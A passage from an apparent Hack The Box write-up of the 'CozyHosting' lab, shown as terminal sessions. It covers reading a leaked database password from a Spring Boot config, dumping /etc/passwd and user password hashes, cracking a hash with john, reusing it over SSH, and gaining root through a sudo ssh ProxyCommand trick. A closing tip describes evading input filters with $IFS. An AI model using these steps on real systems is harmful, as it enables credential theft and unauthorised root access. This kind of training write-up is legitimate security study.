  inflating: BOOT-INF/classes/htb/cloudhosting/secutiry/SecurityConfig.class  
  inflating: BOOT-INF/classes/htb/cloudhosting/secutiry/LoginListener.class  
  inflating: BOOT-INF/classes/htb/cloudhosting/compliance/ComplianceService.class  
  inflating: BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class  
  inflating: BOOT-INF/classes/htb/cloudhosting/exception/ExceptionHandler.class  
  inflating: BOOT-INF/classes/static/assets/css/admin.css  
  inflating: BOOT-INF/classes/static/assets/css/style.css  
  inflating: BOOT-INF/classes/static/assets/js/main.js  
  inflating: BOOT-INF/classes/static/assets/js/admin.js  
  inflating: BOOT-INF/classes/static/assets/img/footer-bg.png  
  inflating: BOOT-INF/classes/static/assets/img/hero-bg.png  
  inflating: BOOT-INF/classes/static/assets/img/profile-img.jpg  
  inflating: BOOT-INF/classes/static/assets/img/values-2.png  
  inflating: BOOT-INF/classes/static/assets/img/values-3.png  
  inflating: BOOT-INF/classes/static/assets/img/pricing-starter.png  
  inflating: BOOT-INF/classes/static/assets/img/values-1.png  
  inflating: BOOT-INF/classes/static/assets/img/pricing-free.png  
  inflating: BOOT-INF/classes/static/assets/img/favicon.png  
  inflating: BOOT-INF/classes/static/assets/img/logo.png  
  inflating: BOOT-INF/classes/static/assets/img/pricing-ultimate.png  
  inflating: BOOT-INF/classes/static/assets/img/pricing-business.png  
  inflating: BOOT-INF/classes/static/assets/img/hero-img.png  
  inflating: BOOT-INF/classes/static/assets/vendor/swiper/swiper-bundle.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/swiper/swiper-bundle.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/swiper/swiper-bundle.min.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/isotope-layout/isotope.pkgd.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/isotope-layout/isotope.pkgd.js  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-grid.rtl.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-utilities.rtl.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-grid.rtl.min.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap.rtl.min.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap.rtl.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-reboot.rtl.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-reboot.min.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-utilities.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-reboot.rtl.min.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-utilities.min.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-grid.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-grid.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap.rtl.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-grid.rtl.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap.min.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-reboot.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-utilities.rtl.min.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap.rtl.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-utilities.rtl.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-reboot.rtl.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-reboot.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-utilities.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-grid.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-utilities.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-utilities.rtl.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-reboot.rtl.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-grid.min.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-grid.rtl.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/bootstrap-reboot.css.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.esm.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.esm.js  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.bundle.js  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.bundle.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.esm.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.js  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.esm.min.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/bootstrap.min.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/glightbox/css/plyr.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/glightbox/css/plyr.css  
  inflating: BOOT-INF/classes/static/assets/vendor/glightbox/css/glightbox.css  
  inflating: BOOT-INF/classes/static/assets/vendor/glightbox/css/glightbox.min.css  
  inflating: BOOT-INF/classes/static/assets/vendor/glightbox/js/glightbox.js  
  inflating: BOOT-INF/classes/static/assets/vendor/glightbox/js/glightbox.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap-icons/bootstrap-icons.css  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap-icons/bootstrap-icons.scss  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap-icons/fonts/bootstrap-icons.woff2  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap-icons/fonts/bootstrap-icons.woff  
  inflating: BOOT-INF/classes/static/assets/vendor/bootstrap-icons/bootstrap-icons.json  
  inflating: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.woff2  
  inflating: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css  
  inflating: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less  
  inflating: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg  
  inflating: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.eot  
  inflating: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg  
  inflating: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.ttf  
  inflating: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.woff  
  inflating: BOOT-INF/classes/static/assets/vendor/php-email-form/validate.js  
  inflating: BOOT-INF/classes/static/assets/vendor/purecounter/purecounter_vanilla.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/purecounter/purecounter_vanilla.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.common.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/extension/dataTool.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/extension/dataTool.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/extension/bmap.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/extension/dataTool.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/extension/bmap.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/extension/bmap.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.common.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.esm.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.simple.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.common.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.esm.js.map  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.simple.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.simple.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/echarts/echarts.esm.min.js  
  inflating: BOOT-INF/classes/static/assets/vendor/aos/aos.css  
  inflating: BOOT-INF/classes/static/assets/vendor/aos/aos.js  
  inflating: BOOT-INF/classes/templates/index.html  
  inflating: BOOT-INF/classes/templates/admin.html  
  inflating: BOOT-INF/classes/templates/login.html  
  inflating: BOOT-INF/classes/application.properties  
  inflating: META-INF/maven/htb.cloudhosting/cloudhosting/pom.xml  
  inflating: META-INF/maven/htb.cloudhosting/cloudhosting/pom.properties  
   creating: BOOT-INF/lib/
 extracting: BOOT-INF/lib/spring-session-core-3.0.0.jar  
 extracting: BOOT-INF/lib/spring-jcl-6.0.4.jar  
 extracting: BOOT-INF/lib/spring-boot-3.0.2.jar  
 extracting: BOOT-INF/lib/spring-boot-autoconfigure-3.0.2.jar  
 extracting: BOOT-INF/lib/logback-classic-1.4.5.jar  
 extracting: BOOT-INF/lib/logback-core-1.4.5.jar  
 extracting: BOOT-INF/lib/log4j-to-slf4j-2.19.0.jar  
 extracting: BOOT-INF/lib/log4j-api-2.19.0.jar  
 extracting: BOOT-INF/lib/jul-to-slf4j-2.0.6.jar  
 extracting: BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar  
 extracting: BOOT-INF/lib/snakeyaml-1.33.jar  
 extracting: BOOT-INF/lib/spring-boot-actuator-autoconfigure-3.0.2.jar  
 extracting: BOOT-INF/lib/spring-boot-actuator-3.0.2.jar  
 extracting: BOOT-INF/lib/jackson-databind-2.14.1.jar  
 extracting: BOOT-INF/lib/jackson-annotations-2.14.1.jar  
 extracting: BOOT-INF/lib/jackson-core-2.14.1.jar  
 extracting: BOOT-INF/lib/jackson-datatype-jsr310-2.14.1.jar  
 extracting: BOOT-INF/lib/micrometer-observation-1.10.3.jar  
 extracting: BOOT-INF/lib/micrometer-commons-1.10.3.jar  
 extracting: BOOT-INF/lib/micrometer-core-1.10.3.jar  
 extracting: BOOT-INF/lib/HdrHistogram-2.1.12.jar  
 extracting: BOOT-INF/lib/LatencyUtils-2.0.3.jar  
 extracting: BOOT-INF/lib/spring-aop-6.0.4.jar  
 extracting: BOOT-INF/lib/spring-beans-6.0.4.jar  
 extracting: BOOT-INF/lib/spring-security-config-6.0.1.jar  
 extracting: BOOT-INF/lib/spring-context-6.0.4.jar  
 extracting: BOOT-INF/lib/spring-security-web-6.0.1.jar  
 extracting: BOOT-INF/lib/spring-expression-6.0.4.jar  
 extracting: BOOT-INF/lib/thymeleaf-spring6-3.1.1.RELEASE.jar  
 extracting: BOOT-INF/lib/thymeleaf-3.1.1.RELEASE.jar  
 extracting: BOOT-INF/lib/attoparser-2.0.6.RELEASE.jar  
 extracting: BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar  
 extracting: BOOT-INF/lib/jackson-datatype-jdk8-2.14.1.jar  
 extracting: BOOT-INF/lib/jackson-module-parameter-names-2.14.1.jar  
 extracting: BOOT-INF/lib/tomcat-embed-core-10.1.5.jar  
 extracting: BOOT-INF/lib/tomcat-embed-el-10.1.5.jar  
 extracting: BOOT-INF/lib/tomcat-embed-websocket-10.1.5.jar  
 extracting: BOOT-INF/lib/spring-web-6.0.4.jar  
 extracting: BOOT-INF/lib/spring-webmvc-6.0.4.jar  
 extracting: BOOT-INF/lib/thymeleaf-extras-springsecurity6-3.1.1.RELEASE.jar  
 extracting: BOOT-INF/lib/slf4j-api-2.0.6.jar  
 extracting: BOOT-INF/lib/aspectjweaver-1.9.19.jar  
 extracting: BOOT-INF/lib/HikariCP-5.0.1.jar  
 extracting: BOOT-INF/lib/spring-jdbc-6.0.4.jar  
 extracting: BOOT-INF/lib/hibernate-core-6.1.6.Final.jar  
 extracting: BOOT-INF/lib/jakarta.persistence-api-3.1.0.jar  
 extracting: BOOT-INF/lib/jakarta.transaction-api-2.0.1.jar  
 extracting: BOOT-INF/lib/jboss-logging-3.5.0.Final.jar  
 extracting: BOOT-INF/lib/hibernate-commons-annotations-6.0.2.Final.jar  
 extracting: BOOT-INF/lib/jandex-2.4.2.Final.jar  
 extracting: BOOT-INF/lib/classmate-1.5.1.jar  
 extracting: BOOT-INF/lib/byte-buddy-1.12.22.jar  
 extracting: BOOT-INF/lib/jaxb-runtime-4.0.1.jar  
 extracting: BOOT-INF/lib/jaxb-core-4.0.1.jar  
 extracting: BOOT-INF/lib/angus-activation-1.0.0.jar  
 extracting: BOOT-INF/lib/txw2-4.0.1.jar  
 extracting: BOOT-INF/lib/istack-commons-runtime-4.1.1.jar  
 extracting: BOOT-INF/lib/jakarta.inject-api-2.0.0.jar  
 extracting: BOOT-INF/lib/antlr4-runtime-4.10.1.jar  
 extracting: BOOT-INF/lib/spring-data-jpa-3.0.1.jar  
 extracting: BOOT-INF/lib/spring-data-commons-3.0.1.jar  
 extracting: BOOT-INF/lib/spring-orm-6.0.4.jar  
 extracting: BOOT-INF/lib/spring-tx-6.0.4.jar  
 extracting: BOOT-INF/lib/spring-aspects-6.0.4.jar  
 extracting: BOOT-INF/lib/lombok-1.18.26.jar  
 extracting: BOOT-INF/lib/postgresql-42.5.1.jar  
 extracting: BOOT-INF/lib/checker-qual-3.5.0.jar  
 extracting: BOOT-INF/lib/jakarta.xml.bind-api-4.0.0.jar  
 extracting: BOOT-INF/lib/jakarta.activation-api-2.1.1.jar  
 extracting: BOOT-INF/lib/spring-core-6.0.4.jar  
 extracting: BOOT-INF/lib/spring-security-core-6.0.1.jar  
 extracting: BOOT-INF/lib/spring-security-crypto-6.0.1.jar  
 extracting: BOOT-INF/lib/spring-boot-jarmode-layertools-3.0.2.jar  
  inflating: BOOT-INF/classpath.idx  
  inflating: BOOT-INF/layers.idx
```
Pulled the file to our attacker machine and inflated with `unzip`

```zsh
┌──(kali㉿kali)-[~/…/cozyhosting/files/BOOT-INF/classes]
└─$ cat application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
Combing through the inflated file system we see what looks like creds for the `postgres` user on the machine.

```zsh
app@cozyhosting:/home$ psql -U postgres --port 5432 -W
Password: 
psql: error: connection to server on socket "/var/run/postgresql/.s.PGSQL.5432" failed: FATAL:  Peer authentication failed for user "postgres"
app@cozyhosting:/home$

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false

```
After unsuccessfully trying to auth to `postgresql` as `postgres` user I checked `/etc/passwd` just to see if the user exists and lo and behold it even has a login shell.

```zsh
app@cozyhosting:/app$ psql -U postgres -h cozyhosting -U postgres -W
Password: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

```
returning back to our attempt to connect we forgot to specify the hostname `cozyhosting` from the leaked config from earlier and we successfully auth to postgresql.

```zsh
cozyhosting=# select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)

cozyhosting=# select * from hosts;
 id | username  |      hostname      
----+-----------+--------------------
  1 | kanderson | suspicious mcnulty
  5 | kanderson | boring mahavira
  6 | kanderson | stoic varahamihira
  7 | kanderson | awesome lalande
(4 rows)
```
moving into the `cozyhosting` db we are able to dump two tables: `users` and `hosts` where we get hashes for `kanderson` and `admin`. We can try to crack these offline for possible pw reuse.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cozyhosting/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt admin_hash               
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:09 DONE (2026-08-03 16:26) 0.1060g/s 297.7p/s 297.7c/s 297.7C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


┌──(kali㉿kali)-[~/CTF/HTB/cozyhosting]
└─$ ssh josh@cozyhosting.htb
The authenticity of host 'cozyhosting.htb (10.129.229.88)' can't be established.
ED25519 key fingerprint is: SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cozyhosting.htb' (ED25519) to the list of known hosts.
josh@cozyhosting.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Aug  3 08:28:12 PM UTC 2026

  System load:           0.16455078125
  Usage of /:            53.9% of 5.42GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             244
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.88
  IPv6 address for eth0: dead:beef::a0de:adff:fea7:e281


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
josh@cozyhosting:~$ 
```
almost immediately we crack the hash for user `admin:manchesterunited` which we successfully abuse reuse to get a shell as user `josh` on our target.

```zsh
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

```
Evaluating his sudo permissions we see that `josh` is able to call `/usr/bin/ssh *` as `root` on the system.

```zsh
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
Found advisory on `GTFOBins` that tells us how to execute a local shell with ssh. Since we have sudo permissions, this particular command string doesn't drop those permissions and gives us a root shell. Pwned.

## Final Thoughts
>[!Takeaways]-
>- When fuzzing/dir bruting/firing off wordlists, be sure to find a wordlist for the framework you discover.
>- If at first your payload won't work, especially in the context of HTML POST requests/input filters, bad characters, etc. remember to mangle the spaces with $IFS and url encode/decode items as needed.
>- specify the host in `psql` if given one from a leaked config, note, etc.
